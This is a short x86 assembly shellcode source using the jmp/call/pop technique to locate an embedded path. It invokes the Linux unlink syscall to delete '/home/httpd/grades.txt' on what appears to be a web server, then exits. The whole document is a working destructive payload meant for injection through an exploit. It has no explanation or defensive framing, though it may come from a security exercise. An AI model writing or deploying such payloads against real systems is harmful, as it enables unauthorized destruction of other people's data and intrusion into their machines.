#define STRING "/home/httpd/grades.txt"
#define STRLEN 22
#define ARGV	(STRLEN+1)
#define ENVP	(ARGV+4)

.globl main
	.type	main, @function
main:
	jmp	calladdr

popladdr:
	popl	%esi
	movl	%esi,(ARGV)(%esi)	/* set up argv pointer to pathname */
	xorl	%eax,%eax		/* get a 32-bit zero value */
	movb	%al,(STRLEN)(%esi)	/* null-terminate our string */
	movl	%eax,(ENVP)(%esi)	/* set up null envp */

	movl $10, %eax       # unlink syscall 
        movl %esi,%ebx       # path to file to delete
	int  $0x80 


  	movl $1, %eax        # exit syscall
    	int  $0x80


calladdr:
	call	popladdr
	.ascii	STRING
